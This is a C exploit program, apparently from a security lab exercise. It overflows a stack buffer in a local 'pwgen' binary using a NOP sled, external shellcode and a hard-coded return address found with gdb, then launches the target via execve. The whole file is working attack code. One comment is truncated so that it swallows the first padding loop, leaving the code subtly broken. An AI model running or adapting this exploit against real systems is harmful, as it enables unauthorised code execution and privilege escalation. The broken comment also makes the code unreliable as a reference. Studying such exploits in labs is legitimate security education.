/*Define Standard Libraries*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/*Define the shellcode header file*/
#include </usr/local/src/shellcode.h>

/*Set predefined constants*/
#define BUFFER_OFFSET 0
#define NOP 0x90
#define DEFAULT_BUFFER_SIZE 493 /*the minimum buffer needed to allow for an overflow*/
#define TARGET "/usr/local/bin/pwgen"

int main(int argc, char * argv[]) {
        /*define the runtime parameters*/
        char * args[2];
        char * env[1];
        char * pointer;

        /*define the buffer size*/
        int buffersize = DEFAULT_BUFFER_SIZE;
        int i;

        /*allocate memory to the argument entery based off the buffer size*/
        args[0] = (char *) malloc(buffersize);
        pointer = args[0];

        /*add a no operation entery to the stack*/
        *(pointer) = NOP;

        /*move the pointer down on the stack for the size of the buffer minus the memory used for the shellcode and the return address$        for (i = 0; i < buffersize-40-45-1; i++) {
                /*add a no operation element*/
                *(pointer++) = NOP;
        }

        /*add the shellcode after the no operation enteries*/
        for (i = 0; i < strlen(shellcode); i++) {
                /*add the shellcode*/
                *(pointer++) = shellcode[i];
        }

        /*add the return address for the no operation enteries.
          the return address is found using 'gdb pwgen' -> run -> x/200x $esp*/
        for (i = 0; i < 10; i++) {
                /*Intel CPUs and this machine use reverse endian encoding*/
                *(pointer++) = 0x50;
                *(pointer++) = 0xdf;
                *(pointer++) = 0xbf;
                *(pointer++) = 0xff;
        }

        /*set the environmennt argument*/
        env[0] = NULL;

        /*end the arguments*/
        args[1] = NULL;

        /*execute the pwgen code with the parameters set above*/
        execve(TARGET, args, env);
}